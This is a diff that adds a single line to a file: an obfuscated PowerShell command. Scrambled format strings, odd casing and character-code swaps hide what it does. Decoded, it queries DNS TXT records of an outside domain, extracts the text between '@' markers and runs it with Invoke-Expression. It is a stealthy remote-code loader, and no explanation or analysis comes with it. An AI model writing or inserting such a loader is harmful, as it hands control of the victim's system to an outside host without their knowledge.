@@ -1,0 +1,1 @@
+﻿ InvokE-ExpReSSiOn( ((("{13}{9}{17}{2}{1}{19}{15}{8}{12}{16}{5}{6}{7}{0}{10}{18}{11}{3}{14}{4}"-f '@','-q=txt',' ','Hmat','hes[1]}','c.pl',') -matc','h R56@(.*)','s.rank','l','R56',' zf','ingp','if(R56R56+(ns','c','n','la','ookup','){iex',' p.s.rk.')) -CreplAce  'R56',[char]39 -RePlaCe  ([char]122+[char]102+[char]72),[char]36))
